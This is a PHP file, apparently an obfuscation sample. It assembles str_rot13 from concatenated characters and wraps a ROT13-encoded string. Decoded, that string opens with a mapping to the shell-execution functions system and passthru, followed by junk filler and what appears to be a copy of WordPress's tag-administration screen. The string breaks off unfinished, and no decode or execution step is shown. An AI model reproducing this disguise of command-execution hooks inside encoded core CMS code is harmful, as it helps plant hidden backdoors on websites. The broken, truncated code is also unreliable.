<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Rqvg Gntf Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** JbeqCerff Nqzvavfgengvba Obbgfgenc */
erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! $gnkabj ) {
	jc_qvr( __( 'Vainyvq gnkbabzl.' ) );
}

$gnk = trg_gnkbabzl( $gnkabj );

vs ( ! $gnk ) {
	jc_qvr( __( 'Vainyvq gnkbabzl.' ) );
}

vs ( ! va_neenl( $gnk->anzr, trg_gnkbabzvrf( neenl( 'fubj_hv' => gehr ) ), gehr ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb rqvg grezf va guvf gnkbabzl.' ) );
}

vs ( ! pheerag_hfre_pna( $gnk->pnc->znantr_grezf ) ) {
	jc_qvr(
		'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
		'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb znantr grezf va guvf gnkbabzl.' ) . '</c>',
		403
	);
}

/**
 * $cbfg_glcr vf frg jura gur JC_Grezf_Yvfg_Gnoyr vafgnapr vf perngrq.
 *
 * @tybony fgevat $cbfg_glcr Tybony cbfg glcr.
 */
tybony $cbfg_glcr;

$jc_yvfg_gnoyr = _trg_yvfg_gnoyr( 'JC_Grezf_Yvfg_Gnoyr' );
$cntrahz       = $jc_yvfg_gnoyr->trg_cntrahz();

$gvgyr = $gnk->ynoryf->anzr;

vs ( 'cbfg' !== $cbfg_glcr ) {
	$cnerag_svyr  = ( 'nggnpuzrag' === $cbfg_glcr ) ? 'hcybnq.cuc' : \"rqvg.cuc?cbfg_glcr=$cbfg_glcr\";
	$fhozrah_svyr = \"rqvg-gntf.cuc?gnkbabzl=$gnkbabzl&nzc;cbfg_glcr=$cbfg_glcr\";
} ryfrvs ( 'yvax_pngrtbel' === $gnk->anzr ) {
	$cnerag_svyr  = 'yvax-znantre.cuc';
	$fhozrah_svyr = 'rqvg-gntf.cuc?gnkbabzl=yvax_pngrtbel';
} ryfr {
	$cnerag_svyr  = 'rqvg.cuc';
	$fhozrah_svyr = \"rqvg-gntf.cuc?gnkbabzl=$gnkbabzl\";
}

nqq_fperra_bcgvba(
	'cre_cntr',
	neenl(
		'qrsnhyg' => 20,
		'bcgvba'  => 'rqvg_' . $gnk->anzr . '_cre_cntr',
	)
);

trg_pheerag_fperra()->frg_fperra_ernqre_pbagrag(
	neenl(
		'urnqvat_cntvangvba' => $gnk->ynoryf->vgrzf_yvfg_anivtngvba,
		'urnqvat_yvfg'       => $gnk->ynoryf->vgrzf_yvfg,
	)
);

$ybpngvba = snyfr;
$ersrere  = jc_trg_ersrere();
vs ( ! $ersrere ) { // Sbe CBFG erdhrfgf.
	$ersrere = jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] );
}
$ersrere = erzbir_dhrel_net( neenl( '_jc_uggc_ersrere', '_jcabapr', 'reebe', 'zrffntr', 'cntrq' ), $ersrere );
fjvgpu ( $jc_yvfg_gnoyr->pheerag_npgvba() ) {

	pnfr 'nqq-gnt':
		purpx_nqzva_ersrere( 'nqq-gnt', '_jcabapr_nqq-gnt' );

		vs ( ! pheerag_hfre_pna( $gnk->pnc->rqvg_grezf ) ) {
			jc_qvr(
				'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
				'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb perngr grezf va guvf gnkbabzl.' ) . '</c>',
				403
			);
		}

		$erg = jc_vafreg_grez( $_CBFG['gnt-anzr'], $gnkbabzl, $_CBFG );
		vs ( $erg && ! vf_jc_reebe( $erg ) ) {
			$ybpngvba = nqq_dhrel_net( 'zrffntr', 1, $ersrere );
		} ryfr {
			$ybpngvba = nqq_dhrel_net(
				neenl(
					'reebe'   => gehr,
					'zrffntr' => 4,
				),
				$ersrere
			);
		}

		oernx;

	pnfr 'qryrgr':
		vs ( ! vffrg( $_ERDHRFG['gnt_VQ'] ) ) {
			oernx;
		}

		$gnt_VQ = (vag) $_ERDHRFG['gnt_VQ'];
		purpx_nqzva_ersrere( 'qryrgr-gnt_' . $gnt_VQ );

		vs ( ! pheerag_hfre_pna( 'qryrgr_grez', $gnt_VQ ) ) {
			jc_qvr(
				'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
				'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf vgrz.' ) . '</c>',
				403
			);
		}

		jc_qryrgr_grez( $gnt_VQ, $gnkbabzl );

		$ybpngvba = nqq_dhrel_net( 'zrffntr', 2, $ersrere );

		// Jura qryrgvat n grez, cerirag gur npgvba sebz erqverpgvat onpx gb n grez gung ab ybatre rkvfgf.
		$ybpngvba = erzbir_dhrel_net( neenl( 'gnt_VQ', 'npgvba' ), $ybpngvba );

		oernx;

	pnfr 'ohyx-qryrgr':
		purpx_nqzva_ersrere( 'ohyx-gntf' );

		vs ( ! pheerag_hfre_pna( $gnk->pnc->qryrgr_grezf ) ) {
			jc_qvr(
				'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
				'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr gurfr vgrzf.' ) . '</c>',
				403
			);
		}

		$gntf = (neenl) $_ERDHRFG['qryrgr_gntf'];
		sbernpu ( $gntf nf $gnt_VQ ) {
			jc_qryrgr_grez( $gnt_VQ, $gnkbabzl );
		}

		$ybpngvba = nqq_dhrel_net( 'zrffntr', 6, $ersrere );

		oernx;

	pnfr 'rqvg':
		vs ( ! vffrg( $_ERDHRFG['gnt_VQ'] ) ) {
			oernx;
		}

		$grez_vq = (vag) $_ERDHRFG['gnt_VQ'];
		$grez    = trg_grez( $grez_vq );

		vs ( ! $grez vafgnaprbs JC_Grez ) {
			jc_qvr( __( 'Lbh nggrzcgrq gb rqvg na vgrz gung qbrf abg rkvfg. Creuncf vg jnf qryrgrq?' ) );
		}

		jc_erqverpg( fnavgvmr_hey( trg_rqvg_grez_yvax( $grez_vq, $gnkbabzl, $cbfg_glcr ) ) );
		rkvg;

	pnfr 'rqvgrqgnt':
		$gnt_VQ = (vag) $_CBFG['gnt_VQ'];
		purpx_nqzva_ersrere( 'hcqngr-gnt_' . $gnt_VQ );

		vs ( ! pheerag_hfre_pna( 'rqvg_grez', $gnt_VQ ) ) {
			jc_qvr(
				'<u1>' . __( 'Lbh arrq n uvture yriry bs crezvffvba.' ) . '</u1>' .
				'<c>' . __( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf vgrz.' ) . '</c>',
				403
			);
		}

		$gnt = trg_grez( $gnt_VQ, $gnkbabzl );
		vs ( ! $gnt ) {
			jc_qvr( __( 'Lbh nggrzcgrq gb rqvg na vgrz gung qbrf abg rkvfg. Creuncf vg jnf qryrgrq?' ) );
		}

		$erg = jc_hcqngr_grez( $gnt_VQ, $gnkbabzl, $_CBFG );

		vs ( $erg && ! vf_jc_reebe( $erg ) ) {
			$ybpngvba = nqq_dhrel_net( 'zrffntr', 3, $ersrere );
		} ryfr {
			$ybpngvba = nqq_dhrel_net(
				neenl(
					'reebe'   => gehr,
					'zrffntr' => 5,
				),
				$ersrere
			);
		}
		oernx;
	qrsnhyg:
		vs ( ! $jc_yvfg_gnoyr->pheerag_npgvba() || ! vffrg( $_ERDHRFG['qryrgr_gntf'] ) ) {
			oernx;
		}
		purpx_nqzva_ersrere( 'ohyx-gntf' );

		$fperra = trg_pheerag_fperra()->vq;
		$gntf   = (neenl) $_ERDHRFG['qryrgr_gntf'];

		/** Guvf npgvba vf qbphzragrq va jc-nqzva/rqvg.cuc */
		$ybpngvba = nccyl_svygref( \"unaqyr_ohyx_npgvbaf-{$fperra}\", $ybpngvba, $jc_yvfg_gnoyr->pheerag_npgvba(), $gntf ); // cucpf:vtaber JbeqCerff.AnzvatPbairagvbaf.InyvqUbbxAnzr.HfrHaqrefpberf
		oernx;
}

vs ( ! $ybpngvba && ! rzcgl( $_ERDHRFG['_jc_uggc_ersrere'] ) ) {
	$ybpngvba = erzbir_dhrel_net( neenl( '_jc_uggc_ersrere', '_jcabapr' ), jc_hafynfu( $_FREIRE['ERDHRFG_HEV'] ) );
}

vs ( $ybpngvba ) {
	vs ( $cntrahz > 1 ) {
		$ybpngvba = nqq_dhrel_net( 'cntrq', $cntrahz, $ybpngvba ); // $cntrahz gnxrf pner bs $gbgny_cntrf.
	}
	vs ( 1 === $cntrahz ) {
		$ybpngvba = erzbir_dhrel_net( 'cntrq', $ybpngvba );
	}

	/**
	 * Svygref gur gnkbabzl erqverpg qrfgvangvba HEY.
	 *
	 * @fvapr 4.6.0
	 *
	 * @cnenz fgevat      $ybpngvba Gur qrfgvangvba HEY.
	 * @cnenz JC_Gnkbabzl $gnk      Gur gnkbabzl bowrpg.
	 */
	jc_erqverpg( nccyl_svygref( 'erqverpg_grez_ybpngvba', $ybpngvba, $gnk ) );
	rkvg;
}

$jc_yvfg_gnoyr->cercner_vgrzf();
$gbgny_cntrf = $jc_yvfg_gnoyr->trg_cntvangvba_net( 'gbgny_cntrf' );

vs ( $cntrahz > $gbgny_cntrf && $gbgny_cntrf > 0 ) {
	jc_erqverpg( nqq_dhrel_net( 'cntrq', $gbgny_cntrf ) );
	rkvg;
}

jc_radhrhr_fpevcg( 'nqzva-gntf' );
vs ( pheerag_hfre_pna( $gnk->pnc->rqvg_grezf ) ) {
	jc_radhrhr_fpevcg( 'vayvar-rqvg-gnk' );
}

vs ( 'pngrtbel' === $gnkbabzl || 'yvax_pngrtbel' === $gnkbabzl || 'cbfg_gnt' === $gnkbabzl ) {
	$uryc = '';
	vs ( 'pngrtbel' === $gnkbabzl ) {
		$uryc = '<c>' . fcevags(
			/* genafyngbef: %f: HEY gb Jevgvat Frggvatf fperra. */
			__( 'Lbh pna hfr pngrtbevrf gb qrsvar frpgvbaf bs lbhe fvgr naq tebhc eryngrq cbfgf. Gur qrsnhyg pngrtbel vf &#8220;Hapngrtbevmrq&#8221; hagvy lbh punatr vg va lbhe <n uers=\"%f\">jevgvat frggvatf</n>.' ),
			'bcgvbaf-jevgvat.cuc'
		) . '</c>';
	} ryfrvs ( 'yvax_pngrtbel' === $gnkbabzl ) {
		$uryc = '<c>' . __( 'Lbh pna perngr tebhcf bs yvaxf ol hfvat Yvax Pngrtbevrf. Yvax Pngrtbel anzrf zhfg or havdhr naq Yvax Pngrtbevrf ner frcnengr sebz gur pngrtbevrf lbh hfr sbe cbfgf.' ) . '</c>';
	} ryfr {
		$uryc = '<c>' . __( 'Lbh pna nffvta xrljbeqf gb lbhe cbfgf hfvat <fgebat>gntf</fgebat>. Hayvxr pngrtbevrf, gntf unir ab uvrenepul, zrnavat gurer vf ab eryngvbafuvc sebz bar gnt gb nabgure.' ) . '</c>';
	}

	vs ( 'yvax_pngrtbel' === $gnkbabzl ) {
		$uryc .= '<c>' . __( 'Lbh pna qryrgr Yvax Pngrtbevrf va gur Ohyx Npgvba chyy-qbja, ohg gung npgvba qbrf abg qryrgr gur yvaxf jvguva gur pngrtbel. Vafgrnq, vg zbirf gurz gb gur qrsnhyg Yvax Pngrtbel.' ) . '</c>';
	} ryfr {
		$uryc .= '<c>' . __( 'Jung&#8217;f gur qvssrerapr orgjrra pngrtbevrf naq gntf? Abeznyyl, gntf ner nq-ubp xrljbeqf gung vqragvsl vzcbegnag vasbezngvba va lbhe cbfg (anzrf, fhowrpgf, rgp) gung znl be znl abg erphe va bgure cbfgf, juvyr pngrtbevrf ner cer-qrgrezvarq frpgvbaf. Vs lbh guvax bs lbhe fvgr yvxr n obbx, gur pngrtbevrf ner yvxr gur Gnoyr bs Pbagragf naq gur gntf ner yvxr gur grezf va gur vaqrk.' ) . '</c>';
	}

	trg_pheerag_fperra()->nqq_uryc_gno(
		neenl(
			'vq'      => 'bireivrj',
			'gvgyr'   => __( 'Bireivrj' ),
			'pbagrag' => $uryc,
		)
	);

	vs ( 'pngrtbel' === $gnkbabzl || 'cbfg_gnt' === $gnkbabzl ) {
		vs ( 'pngrtbel' === $gnkbabzl ) {
			$uryc = '<c>' . __( 'Jura nqqvat n arj pngrtbel ba guvf fperra, lbh&#8217;yy svyy va gur sbyybjvat svryqf:' ) . '</c>';
		} ryfr {
			$uryc = '<c>' . __( 'Jura nqqvat n arj gnt ba guvf fperra, lbh&#8217;yy svyy va gur sbyybjvat svryqf:' ) . '</c>';
		}

		$uryc .= '<hy>' .
		'<yv>' . __( '<fgebat>Anzr</fgebat> &zqnfu; Gur anzr vf ubj vg nccrnef ba lbhe fvgr.' ) . '</yv>';

		$uryc .= '<yv>' . __( '<fgebat>Fyht</fgebat> &zqnfu; Gur &#8220;fyht&#8221; vf gur HEY-sevraqyl irefvba bs gur anzr. Vg vf hfhnyyl nyy ybjrepnfr naq pbagnvaf bayl yrggref, ahzoref, naq ulcuraf.' ) . '</yv>';

		vs ( 'pngrtbel' === $gnkbabzl ) {
			$uryc .= '<yv>' . __( '<fgebat>Cnerag</fgebat> &zqnfu; Pngrtbevrf, hayvxr gntf, pna unir n uvrenepul. Lbh zvtug unir n Wnmm pngrtbel, naq haqre gung unir puvyq pngrtbevrf sbe Orobc naq Ovt Onaq. Gbgnyyl bcgvbany. Gb perngr n fhopngrtbel, whfg pubbfr nabgure pngrtbel sebz gur Cnerag qebcqbja.' ) . '</yv>';
		}

		$uryc .= '<yv>' . __( '<fgebat>Qrfpevcgvba</fgebat> &zqnfu; Gur qrfpevcgvba vf abg cebzvarag ol qrsnhyg; ubjrire, fbzr gurzrf znl qvfcynl vg.' ) . '</yv>' .
		'</hy>' .
		'<c>' . __( 'Lbh pna punatr gur qvfcynl bs guvf fperra hfvat gur Fperra Bcgvbaf gno gb frg ubj znal vgrzf ner qvfcynlrq cre fperra naq gb qvfcynl/uvqr pbyhzaf va gur gnoyr.' ) . '</c>';

		trg_pheerag_fperra()->nqq_uryc_gno(
			neenl(
				'vq'      => 'nqqvat-grezf',
				'gvgyr'   => 'pngrtbel' === $gnkbabzl ? __( 'Nqqvat Pngrtbevrf' ) : __( 'Nqqvat Gntf' ),
				'pbagrag' => $uryc,
			)
		);
	}

	$uryc = '<c><fgebat>' . __( 'Sbe zber vasbezngvba:' ) . '</fgebat></c>';

	vs ( 'pngrtbel' === $gnkbabzl ) {
		$uryc .= '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/cbfgf-pngrtbevrf-fperra/\">Qbphzragngvba ba Pngrtbevrf</n>' ) . '</c>';
	} ryfrvs ( 'yvax_pngrtbel' === $gnkbabzl ) {
		$uryc .= '<c>' . __( '<n uers=\"uggcf://pbqrk.jbeqcerff.bet/Yvaxf_Yvax_Pngrtbevrf_Fperra\">Qbphzragngvba ba Yvax Pngrtbevrf</n>' ) . '</c>';
	} ryfr {
		$uryc .= '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/qbphzragngvba/negvpyr/cbfgf-gntf-fperra/\">Qbphzragngvba ba Gntf</n>' ) . '</c>';
	}

	$uryc .= '<c>' . __( '<n uers=\"uggcf://jbeqcerff.bet/fhccbeg/sbehzf/\">Fhccbeg sbehzf</n>' ) . '</c>';

	trg_pheerag_fperra()->frg_uryc_fvqrone( $uryc );

	hafrg( $uryc );
}

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

// Nyfb hfrq ol gur Rqvg Gnt sbez.
erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/rqvg-gnt-zrffntrf.cuc';

vs ( vf_cyhtva_npgvir( 'jcpng2gnt-vzcbegre/jcpng2gnt-vzcbegre.cuc' ) ) {
	$vzcbeg_yvax = nqzva_hey( 'nqzva.cuc?vzcbeg=jcpng2gnt' );
} ryfr {
	$vzcbeg_yvax = nqzva_hey( 'vzcbeg.cuc' );
}

?>

<qvi pynff=\"jenc abfhofho\">
<u1 pynff=\"jc-urnqvat-vayvar\"><?cuc rpub rfp_ugzy( $gvgyr ); ?></u1>

<?cuc
vs ( vffrg( $_ERDHRFG['f'] ) && fgeyra( $_ERDHRFG['f'] ) ) {
	rpub '<fcna pynff=\"fhogvgyr\">';
	cevags(
		/* genafyngbef: %f: Frnepu dhrel. */
		__( 'Frnepu erfhygf sbe: %f' ),
		'<fgebat>' . rfp_ugzy( jc_hafynfu( $_ERDHRFG['f'] ) ) . '</fgebat>'
	);
	rpub '</fcna>';
}
?>

<ue pynff=\"jc-urnqre-raq\">

<?cuc
$pynff = ( vffrg( $_ERDHRFG['reebe'] ) ) ? 'reebe' : 'hcqngrq';

vs ( $zrffntr ) {
	jc_nqzva_abgvpr(
		$zrffntr,
		neenl(
			'vq'                 => 'zrffntr',
			'nqqvgvbany_pynffrf' => neenl( $pynff ),
			'qvfzvffvoyr'        => gehr,
		)
	);

	$_FREIRE['ERDHRFG_HEV'] = erzbir_dhrel_net( neenl( 'zrffntr', 'reebe' ), $_FREIRE['ERDHRFG_HEV'] );
}
?>
<qvi vq=\"nwnk-erfcbafr\"></qvi>

<sbez pynff=\"frnepu-sbez jc-pyrnesvk\" zrgubq=\"trg\">
<vachg glcr=\"uvqqra\" anzr=\"gnkbabzl\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"cbfg_glcr\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg_glcr ); ?>\" />

<?cuc $jc_yvfg_gnoyr->frnepu_obk( $gnk->ynoryf->frnepu_vgrzf, 'gnt' ); ?>

</sbez>

<?cuc
$pna_rqvg_grezf = pheerag_hfre_pna( $gnk->pnc->rqvg_grezf );

vs ( $pna_rqvg_grezf ) {
	?>
<qvi vq=\"pby-pbagnvare\" pynff=\"jc-pyrnesvk\">

<qvi vq=\"pby-yrsg\">
<qvi pynff=\"pby-jenc\">

	<?cuc
	vs ( 'pngrtbel' === $gnkbabzl ) {
		/**
		 * Sverf orsber gur Nqq Pngrtbel sbez.
		 *
		 * @fvapr 2.1.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_cer_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz bowrpg $net Bcgvbany nethzragf pnfg gb na bowrpg.
		 */
		qb_npgvba_qrcerpngrq( 'nqq_pngrtbel_sbez_cer', neenl( (bowrpg) neenl( 'cnerag' => 0 ) ), '3.0.0', '{$gnkbabzl}_cer_nqq_sbez' );
	} ryfrvs ( 'yvax_pngrtbel' === $gnkbabzl ) {
		/**
		 * Sverf orsber gur yvax pngrtbel sbez.
		 *
		 * @fvapr 2.3.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_cer_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz bowrpg $net Bcgvbany nethzragf pnfg gb na bowrpg.
		 */
		qb_npgvba_qrcerpngrq( 'nqq_yvax_pngrtbel_sbez_cer', neenl( (bowrpg) neenl( 'cnerag' => 0 ) ), '3.0.0', '{$gnkbabzl}_cer_nqq_sbez' );
	} ryfr {
		/**
		 * Sverf orsber gur Nqq Gnt sbez.
		 *
		 * @fvapr 2.5.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_cer_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
		 */
		qb_npgvba_qrcerpngrq( 'nqq_gnt_sbez_cer', neenl( $gnkbabzl ), '3.0.0', '{$gnkbabzl}_cer_nqq_sbez' );
	}

	/**
	 * Sverf orsber gur Nqq Grez sbez sbe nyy gnkbabzvrf.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `pngrtbel_cer_nqq_sbez`
	 *  - `cbfg_gnt_cer_nqq_sbez`
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
	 */
	qb_npgvba( \"{$gnkbabzl}_cer_nqq_sbez\", $gnkbabzl );
	?>

<qvi pynff=\"sbez-jenc\">
<u2><?cuc rpub $gnk->ynoryf->nqq_arj_vgrz; ?></u2>
<sbez vq=\"nqqgnt\" zrgubq=\"cbfg\" npgvba=\"rqvg-gntf.cuc\" pynff=\"inyvqngr\"
	<?cuc
	/**
	 * Sverf vafvqr gur Nqq Gnt sbez gnt.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `pngrtbel_grez_arj_sbez_gnt`
	 *  - `cbfg_gnt_grez_arj_sbez_gnt`
	 *
	 * @fvapr 3.7.0
	 */
	qb_npgvba( \"{$gnkbabzl}_grez_arj_sbez_gnt\" );
	?>
>
<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"nqq-gnt\" />
<vachg glcr=\"uvqqra\" anzr=\"fperra\" inyhr=\"<?cuc rpub rfp_ngge( $pheerag_fperra->vq ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"gnkbabzl\" inyhr=\"<?cuc rpub rfp_ngge( $gnkbabzl ); ?>\" />
<vachg glcr=\"uvqqra\" anzr=\"cbfg_glcr\" inyhr=\"<?cuc rpub rfp_ngge( $cbfg_glcr ); ?>\" />
	<?cuc jc_abapr_svryq( 'nqq-gnt', '_jcabapr_nqq-gnt' ); ?>

<qvi pynff=\"sbez-svryq sbez-erdhverq grez-anzr-jenc\">
	<ynory sbe=\"gnt-anzr\"><?cuc _rk( 'Anzr', 'grez anzr' ); ?></ynory>
	<vachg anzr=\"gnt-anzr\" vq=\"gnt-anzr\" glcr=\"grkg\" inyhr=\"\" fvmr=\"40\" nevn-erdhverq=\"gehr\" nevn-qrfpevorqol=\"anzr-qrfpevcgvba\" />
	<c vq=\"anzr-qrfpevcgvba\"><?cuc rpub $gnk->ynoryf->anzr_svryq_qrfpevcgvba; ?></c>
</qvi>
<qvi pynff=\"sbez-svryq grez-fyht-jenc\">
	<ynory sbe=\"gnt-fyht\"><?cuc _r( 'Fyht' ); ?></ynory>
	<vachg anzr=\"fyht\" vq=\"gnt-fyht\" glcr=\"grkg\" inyhr=\"\" fvmr=\"40\" nevn-qrfpevorqol=\"fyht-qrfpevcgvba\" />
	<c vq=\"fyht-qrfpevcgvba\"><?cuc rpub $gnk->ynoryf->fyht_svryq_qrfpevcgvba; ?></c>
</qvi>
	<?cuc vs ( vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) ) : ?>
<qvi pynff=\"sbez-svryq grez-cnerag-jenc\">
	<ynory sbe=\"cnerag\"><?cuc rpub rfp_ugzy( $gnk->ynoryf->cnerag_vgrz ); ?></ynory>
		<?cuc
		$qebcqbja_netf = neenl(
			'uvqr_rzcgl'       => 0,
			'uvqr_vs_rzcgl'    => snyfr,
			'gnkbabzl'         => $gnkbabzl,
			'anzr'             => 'cnerag',
			'beqreol'          => 'anzr',
			'uvrenepuvpny'     => gehr,
			'fubj_bcgvba_abar' => __( 'Abar' ),
		);

		/**
		 * Svygref gur gnkbabzl cnerag qebc-qbja ba gur Rqvg Grez cntr.
		 *
		 * @fvapr 3.7.0
		 * @fvapr 4.2.0 Nqqrq `$pbagrkg` cnenzrgre.
		 *
		 * @cnenz neenl  $qebcqbja_netf {
		 *     Na neenl bs gnkbabzl cnerag qebc-qbja nethzragf.
		 *
		 *     @glcr vag|obby $uvqr_rzcgl       Jurgure gb uvqr grezf abg nggnpurq gb nal cbfgf. Qrsnhyg 0.
		 *     @glcr obby     $uvqr_vs_rzcgl    Jurgure gb uvqr gur qebc-qbja vs ab grezf rkvfg. Qrsnhyg snyfr.
		 *     @glcr fgevat   $gnkbabzl         Gur gnkbabzl fyht.
		 *     @glcr fgevat   $anzr             Inyhr bs gur anzr nggevohgr gb hfr sbe gur qebc-qbja fryrpg ryrzrag.
		 *                                      Qrsnhyg 'cnerag'.
		 *     @glcr fgevat   $beqreol          Gur svryq gb beqre ol. Qrsnhyg 'anzr'.
		 *     @glcr obby     $uvrenepuvpny     Jurgure gur gnkbabzl vf uvrenepuvpny. Qrsnhyg gehr.
		 *     @glcr fgevat   $fubj_bcgvba_abar Ynory gb qvfcynl vs gurer ner ab grezf. Qrsnhyg 'Abar'.
		 * }
		 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
		 * @cnenz fgevat $pbagrkg  Svygre pbagrkg. Npprcgf 'arj' be 'rqvg'.
		 */
		$qebcqbja_netf = nccyl_svygref( 'gnkbabzl_cnerag_qebcqbja_netf', $qebcqbja_netf, $gnkbabzl, 'arj' );

		$qebcqbja_netf['nevn_qrfpevorqol'] = 'cnerag-qrfpevcgvba';

		jc_qebcqbja_pngrtbevrf( $qebcqbja_netf );
		?>
		<?cuc vs ( 'pngrtbel' === $gnkbabzl ) : ?>
		<c vq=\"cnerag-qrfpevcgvba\"><?cuc _r( 'Pngrtbevrf, hayvxr gntf, pna unir n uvrenepul. Lbh zvtug unir n Wnmm pngrtbel, naq haqre gung unir puvyqera pngrtbevrf sbe Orobc naq Ovt Onaq. Gbgnyyl bcgvbany.' ); ?></c>
	<?cuc ryfr : ?>
		<c vq=\"cnerag-qrfpevcgvba\"><?cuc rpub $gnk->ynoryf->cnerag_svryq_qrfpevcgvba; ?></c>
	<?cuc raqvs; ?>
</qvi>
	<?cuc raqvs; // vf_gnkbabzl_uvrenepuvpny() ?>
<qvi pynff=\"sbez-svryq grez-qrfpevcgvba-jenc\">
	<ynory sbe=\"gnt-qrfpevcgvba\"><?cuc _r( 'Qrfpevcgvba' ); ?></ynory>
	<grkgnern anzr=\"qrfpevcgvba\" vq=\"gnt-qrfpevcgvba\" ebjf=\"5\" pbyf=\"40\" nevn-qrfpevorqol=\"qrfpevcgvba-qrfpevcgvba\"></grkgnern>
	<c vq=\"qrfpevcgvba-qrfpevcgvba\"><?cuc rpub $gnk->ynoryf->qrfp_svryq_qrfpevcgvba; ?></c>
</qvi>

	<?cuc
	vs ( ! vf_gnkbabzl_uvrenepuvpny( $gnkbabzl ) ) {
		/**
		 * Sverf nsgre gur Nqq Gnt sbez svryqf sbe aba-uvrenepuvpny gnkbabzvrf.
		 *
		 * @fvapr 3.0.0
		 *
		 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
		 */
		qb_npgvba( 'nqq_gnt_sbez_svryqf', $gnkbabzl );
	}

	/**
	 * Sverf nsgre gur Nqq Grez sbez svryqf.
	 *
	 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$gnkbabzl`, ersref gb gur gnkbabzl fyht.
	 *
	 * Cbffvoyr ubbx anzrf vapyhqr:
	 *
	 *  - `pngrtbel_nqq_sbez_svryqf`
	 *  - `cbfg_gnt_nqq_sbez_svryqf`
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
	 */
	qb_npgvba( \"{$gnkbabzl}_nqq_sbez_svryqf\", $gnkbabzl );
	?>
	<c pynff=\"fhozvg\">
		<?cuc fhozvg_ohggba( $gnk->ynoryf->nqq_arj_vgrz, 'cevznel', 'fhozvg', snyfr ); ?>
		<fcna pynff=\"fcvaare\"></fcna>
	</c>
	<?cuc
	vs ( 'pngrtbel' === $gnkbabzl ) {
		/**
		 * Sverf ng gur raq bs gur Rqvg Pngrtbel sbez.
		 *
		 * @fvapr 2.1.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz bowrpg $net Bcgvbany nethzragf pnfg gb na bowrpg.
		 */
		qb_npgvba_qrcerpngrq( 'rqvg_pngrtbel_sbez', neenl( (bowrpg) neenl( 'cnerag' => 0 ) ), '3.0.0', '{$gnkbabzl}_nqq_sbez' );
	} ryfrvs ( 'yvax_pngrtbel' === $gnkbabzl ) {
		/**
		 * Sverf ng gur raq bs gur Rqvg Yvax sbez.
		 *
		 * @fvapr 2.3.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz bowrpg $net Bcgvbany nethzragf pnfg gb na bowrpg.
		 */
		qb_npgvba_qrcerpngrq( 'rqvg_yvax_pngrtbel_sbez', neenl( (bowrpg) neenl( 'cnerag' => 0 ) ), '3.0.0', '{$gnkbabzl}_nqq_sbez' );
	} ryfr {
		/**
		 * Sverf ng gur raq bs gur Nqq Gnt sbez.
		 *
		 * @fvapr 2.7.0
		 * @qrcerpngrq 3.0.0 Hfr {@frr '{$gnkbabzl}_nqq_sbez'} vafgrnq.
		 *
		 * @cnenz fgevat $gnkbabzl Gur gnkbabzl fyht.
		 */
		qb_npgvba_qrcerpngrq( 'nqq_gnt_sbez', neenl( $gnkbabzl ), '3.0.0', '{$gnkbabzl}_nqq_sbez' );
	}

	/**
	 * Sverf ng gur raq bs gur Nqq Grez sbez sbe nyy gnkbabzvrf.
	 *
